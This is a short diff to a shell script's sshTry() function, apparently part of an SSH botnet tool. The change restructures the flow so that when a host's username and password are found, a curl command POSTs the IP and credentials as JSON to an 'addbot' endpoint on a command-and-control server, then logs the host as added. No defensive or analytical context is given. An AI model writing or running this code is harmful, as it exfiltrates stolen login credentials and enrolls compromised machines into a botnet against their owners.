@@ -69,11 +69,12 @@ sshTry()
 		echo ""
 		echo "user name and password not found for $1"
 		echo ""
-		exit 0
+		# exit 0
+	else
+		curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc:$port/addbot
+		echo "$val" >>$OUTPUTFILE
+		echo "$val added"
 	fi
-	curl --header "Content-Type: application/json" --request POST --data "{\"ip\":\"$1\",\"username\":\"$uname\",\"password\":\"$pass\"}" http://$cnc:$port/addbot
-	echo "$val" >>$OUTPUTFILE
-	echo "$val added"
 }
 
 
